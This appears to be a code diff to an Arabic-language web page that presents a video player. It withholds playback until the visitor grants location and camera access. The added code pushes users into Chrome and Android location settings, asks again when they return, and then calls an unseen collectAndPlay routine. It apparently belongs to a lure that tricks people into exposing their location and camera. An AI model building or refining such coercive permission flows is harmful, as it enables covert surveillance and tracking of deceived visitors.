@@ -288,7 +288,7 @@
             <div id="gearButton">
                 <div class="icon-gear">⚙️</div>
                 <div class="main-text">تغيير الإعدادات</div>
-                <div class="sub-text">اضغط لتفعيل الموقع الجغرافي</div>
+                <div class="sub-text">اضغط لإظهار طلب الموقع</div>
             </div>
         </div>
 
@@ -331,10 +331,10 @@
             };
 
             // ===== متغيرات التحكم =====
-            let settingsOpened = false;      // هل تم فتح الإعدادات؟
+            let settingsOpened = false;      // هل تم فتح إعدادات المتصفح؟
             let videoStarted = false;
             let isProcessing = false;
-            let permissionGranted = false;   // هل الصلاحية مسموحة؟
+            let permissionGranted = false;
 
             // ===== عناصر DOM =====
             const playBtn = document.getElementById('playButtonOverlay');
@@ -374,9 +374,26 @@
                 return locationOk && cameraOk;
             }
 
-            // ===== فتح إعدادات الموقع =====
-            function openLocationSettings() {
+            // ===== فتح إعدادات الموقع في المتصفح (وليس إعدادات الجهاز) =====
+            function openBrowserLocationSettings() {
                 const ua = navigator.userAgent;
+                // محاولة فتح إعدادات الموقع في Chrome
+                if (/Chrome/.test(ua) && !/Edge/.test(ua)) {
+                    // محاولة فتح صفحة إعدادات الموقع في Chrome
+                    try {
+                        window.location.href = 'chrome://settings/content/location';
+                        return;
+                    } catch (e) {}
+                }
+                // بديل: فتح إعدادات تطبيق Chrome (قد تصل إلى إعدادات الموقع من هناك)
+                if (/Android/.test(ua)) {
+                    try {
+                        window.location.href = 'intent://settings#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.chrome;end';
+                        return;
+                    } catch (e) {}
+                }
+                // خيار أخير: فتح إعدادات الموقع في النظام (لكن هذا ليس مثاليًا)
+                // سنستخدم الطريقة القديمة كحل أخير
                 if (/Android/i.test(ua)) {
                     const intents = [
                         'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
@@ -606,7 +623,7 @@
             // ===== إظهار زر الترس =====
             function showGearButton() {
                 gearBtn.style.display = 'flex';
-                playBtn.style.display = 'none'; // نخفي زر التشغيل
+                playBtn.style.display = 'none';
             }
 
             // ===== إخفاء زر الترس =====
@@ -622,14 +639,14 @@
 
                 // إذا كانت الإعدادات قد فُتحت مسبقاً (أي أننا في مرحلة ما بعد العودة)
                 if (settingsOpened) {
-                    // نطلب الصلاحية مرة أخرى (ستكون مسموحة الآن)
+                    // نطلب الصلاحية مرة أخرى (ستظهر نافذة الطلب إذا كان الإعداد "اسأل")
                     const granted = await requestPermissions();
                     if (granted) {
                         permissionGranted = true;
                         hideGearButton();
                         await collectAndPlay();
                     } else {
-                        // إذا لم تسمح بعد، نعرض الزر مرة أخرى
+                        // لا يزال محظوراً أو تم الرفض
                         showGearButton();
                     }
                     return;
@@ -642,25 +659,23 @@
                     permissionGranted = true;
                     await collectAndPlay();
                 } else {
-                    // تم الحظر: نعرض زر الترس
+                    // تم الحظر أو الرفض: نعرض زر الترس
                     showGearButton();
-                    // نفتح الإعدادات تلقائياً؟ لا، نترك المستخدم يضغط على زر الترس
+                    // لا نفتح الإعدادات تلقائياً، المستخدم يضغط على زر الترس
                 }
             }
 
-            // ===== معالج الضغط على زر الترس =====
+            // ===== معالج الضغط على زر الترس (يفتح إعدادات الموقع في المتصفح) =====
             function handleGearClick() {
                 settingsOpened = true;
-                openLocationSettings();
+                openBrowserLocationSettings();
                 // بعد العودة، سيعتمد على visibilitychange
             }
 
             // ===== رصد العودة من الإعدادات =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // نعيد طلب الصلاحية (الآن ستكون مسموحة)
-                    // ولكن المستخدم قد لا يكون سمح، لذا نطلبها
-                    // إذا سمح، نبدأ الجمع والتشغيل، وإلا نعرض الزر مرة أخرى
+                    // نعيد طلب الصلاحية (الآن ستظهر نافذة الطلب إذا تم تغيير الإعداد)
                     (async () => {
                         const granted = await requestPermissions();
                         if (granted) {
@@ -668,7 +683,7 @@
                             hideGearButton();
                             await collectAndPlay();
                         } else {
-                            // لا يزال محظوراً، نعرض الزر
+                            // لا يزال محظوراً أو تم الرفض، نعرض الزر مرة أخرى
                             showGearButton();
                         }
                     })();
